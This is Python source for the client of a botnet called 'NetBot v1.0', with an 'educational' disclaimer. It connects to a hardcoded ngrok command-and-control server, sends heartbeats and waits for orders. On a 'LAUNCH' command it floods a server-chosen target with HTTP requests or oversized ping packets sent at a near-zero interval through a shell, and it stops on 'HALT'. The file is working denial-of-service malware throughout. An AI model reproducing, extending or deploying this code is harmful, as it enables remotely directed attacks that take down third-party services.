#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran
# Tool 		 : NetBot v1.0
# 
# Description	 : This is a command & control center client-server code.
#              		Should be used only for educational, research purposes and internal use only.
#

import socket
import time
import threading
import time
#import requests
import os
import urllib.request
import subprocess
import signal



class lauchLoad:
      
	def __init__(self):
		self._running = True
      
	def terminate(self):
		self._running = False
      
	def run(self, n):
		run = 0
		#terminate = 0
		if n[3]=="HTTPFLOOD":
			while self._running and statusSet:
				receiving_url = 'http://'+n[0]+':'+n[1]+'/'
				u = urllib.request.urlopen(receiving_url).read()
				time.sleep(int(n[4]))

		if n[3]=="PINGFLOOD":
			while self._running:
				if statusSet:
					if run == 0:
						receiving_url = 'ping '+n[0]+' -i 0.0000001 -s 65000 > /dev/null 2>&1'
						pro = subprocess.Popen(receiving_url, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
						run = 1
				else:
					if run == 1:
						os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
						run = 0
						break
				


def Main():

	#Flags
	global statusSet
	statusSet = 0
	global updated
	updated = 0
	global terminate
	terminate = 0


	host = '0.tcp.sa.ngrok.io' #server
	port = 12514 #server

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Establishing a TCP Connection
	try:
		s.connect((host,port)) # Connect to the  Server
		message = "HEARTBEAT" # Sends Alive Pings to Server
		
	except Exception as e:
		print(f"❌ Error: {e}")
		print(" Server not online. Retrying every 15 seconds...")
		updated = 0
		time.sleep(15)
		Main()
		
	while True:

		# message sent to server
		try:
			s.send(message.encode())	

		except:
			Main()
		# message received from server
		data = s.recv(1024)

		print('Response:',str(data.decode()))

		data = str(data.decode())
		data = data.split('_')
		print('server Response: ', data)  #check list empty code
		if len(data) > 1:
			
			runStatus = data[2]
		else:
			runStatus = "OFFLINE"
			

		print('Response: ', runStatus)
		
		if runStatus == "LAUNCH":
			if statusSet == 0:
				# start a new thread and starts a new process
				statusSet = 1
				c = lauchLoad()
				t = threading.Thread(target = c.run, args =(data, ))
				t.start()
				
			else:
				time.sleep(15)
				if t.is_alive():
					print('Connecting...')
			#else: 
			continue
		elif runStatus == "HALT":
			statusSet = 0
			time.sleep(30)
			continue
		elif runStatus == "HOLD":
			statusSet = 0
			print('Waiting for Instructions from server. Retrying in 30 seconds...')
			time.sleep(30)
		else:
			statusSet = 0
			print('Server Offline. Retrying in 30 seconds...')
			updated = 0
			time.sleep(30)
	# close the connection
	s.close()

if __name__ == '__main__':
	Main()